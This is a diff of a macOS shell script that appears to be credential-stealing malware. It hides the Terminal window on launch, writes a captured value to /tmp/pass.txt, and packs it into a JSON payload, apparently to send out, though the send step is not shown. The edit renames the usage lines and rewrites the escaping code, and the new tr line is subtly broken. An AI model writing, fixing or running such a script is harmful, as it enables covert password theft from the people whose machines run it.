@@ -15,8 +15,8 @@
 #   - macOS with osascript, curl, and standard Unix utilities.
 #
 # Usage:
-#   chmod +x combined_script.sh
-#   ./combined_script.sh
+#   chmod +x script.sh
+#   ./script.sh
 
 # --- Hide Terminal Immediately ---
 osascript -e 'tell application "Terminal" to set visible of front window to false'
@@ -125,8 +125,8 @@ else
     echo -e "$capture" > /tmp/pass.txt
     
     # --- Manually Generate JSON Payload Without Python ---
-    # Use awk to join all lines with literal \n (note the double escaping) and sed to escape double quotes.
-    content=$(awk 'BEGIN{ORS="\\\\n"} {print}' /tmp/pass.txt | sed 's/"/\\"/g')
+    # Replace actual newlines with literal "\n" using tr, and escape any double quotes.
+    content=$(tr '\n' '\\n' < /tmp/pass.txt | sed 's/"/\\"/g')
     payload=$(printf '{"content": "%s"}' "$content")
     
     # --- Debug: Log the payload for troubleshooting ---
